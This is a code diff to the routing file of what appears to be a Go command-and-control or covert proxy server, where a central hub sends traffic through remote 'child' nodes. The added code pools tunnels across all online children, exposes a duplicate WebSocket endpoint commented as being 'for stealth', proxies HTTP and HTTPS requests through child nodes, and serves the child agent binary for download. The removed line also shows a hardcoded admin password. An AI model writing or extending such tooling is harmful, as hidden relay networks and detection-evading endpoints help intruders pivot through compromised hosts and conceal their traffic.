@@ -18,7 +18,7 @@ var webAssets embed.FS
 
 var (
 	adminUsername = "huanx"
-	adminPassword = "m1234"
+	adminPassword = "REDACTED1"
 	adminSessions = sync.Map{} // token -> expiry
 )
 
@@ -165,6 +165,36 @@ func SetupRoutes(mux *http.ServeMux, hub *Hub, tm *TunnelManager) {
 			if req.ID == "" {
 				req.ID = generateID()
 			}
+
+			// If no child_id specified, add ALL online children to pool
+			if req.ChildID == "" {
+				children := hub.ListChildren()
+				if len(children) == 0 {
+					writeJSON(w, map[string]string{"error": "no children online"})
+					return
+				}
+				var tunnels []*Tunnel
+				for i, c := range children {
+					tid := req.ID
+					if i > 0 {
+						tid = generateID()
+					}
+					t, err := tm.OpenTunnel(tid, c.ID, req.Target, req.ListenPort)
+					if err != nil {
+						writeJSON(w, map[string]string{"error": err.Error()})
+						return
+					}
+					tunnels = append(tunnels, t)
+				}
+				writeJSON(w, map[string]interface{}{
+					"tunnels": tunnels,
+					"count":   len(tunnels),
+					"port":    req.ListenPort,
+					"target":  req.Target,
+				})
+				return
+			}
+
 			tunnel, err := tm.OpenTunnel(req.ID, req.ChildID, req.Target, req.ListenPort)
 			if err != nil {
 				writeJSON(w, map[string]string{"error": err.Error()})
@@ -236,8 +266,57 @@ func SetupRoutes(mux *http.ServeMux, hub *Hub, tm *TunnelManager) {
 		w.Write(data)
 	})
 
-	// WS for children
+	// WS for children (both /ws and /api/stream for stealth)
 	mux.HandleFunc("/ws", hub.HandleWS)
+	mux.HandleFunc("/api/stream", hub.HandleWS)
+
+	// HTTP Proxy via child nodes:
+	//   /p/http/host/path   -> HTTP
+	//   /p/https/host/path  -> HTTPS
+	//   /p/host/path        -> HTTP (backward compat)
+	mux.HandleFunc("/p/", func(w http.ResponseWriter, r *http.Request) {
+		path := strings.TrimPrefix(r.URL.Path, "/p/")
+		if path == "" || path == "/" {
+			http.Error(w, "missing target", 400)
+			return
+		}
+
+		// Check if first segment is http/https scheme hint
+		useTLS := false
+		if strings.HasPrefix(path, "http/") {
+			path = path[5:] // strip "http/"
+		} else if strings.HasPrefix(path, "https/") {
+			useTLS = true
+			path = path[6:] // strip "https/"
+		}
+
+		// Extract host[:port] from first path segment
+		target := path
+		if idx := strings.Index(path, "/"); idx >= 0 {
+			target = path[:idx]
+		}
+		if !strings.Contains(target, ":") {
+			if useTLS {
+				target += ":443"
+			} else {
+				target += ":80"
+			}
+		}
+
+		// Rewrite URL path so ProxyHTTP can strip correctly
+		r.URL.Path = "/p/" + path
+		r.URL.RawPath = ""
+		r.RequestURI = r.URL.RequestURI()
+
+		hub.ProxyHTTP(target, w, r)
+	})
+
+	// Download child binary
+	mux.HandleFunc("/dl/child", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Header().Set("Content-Disposition", "attachment; filename=child")
+		http.ServeFile(w, r, "child-linux-amd64")
+	})
 
 	// WebUI
 	webFS, err := fs.Sub(webAssets, "web")
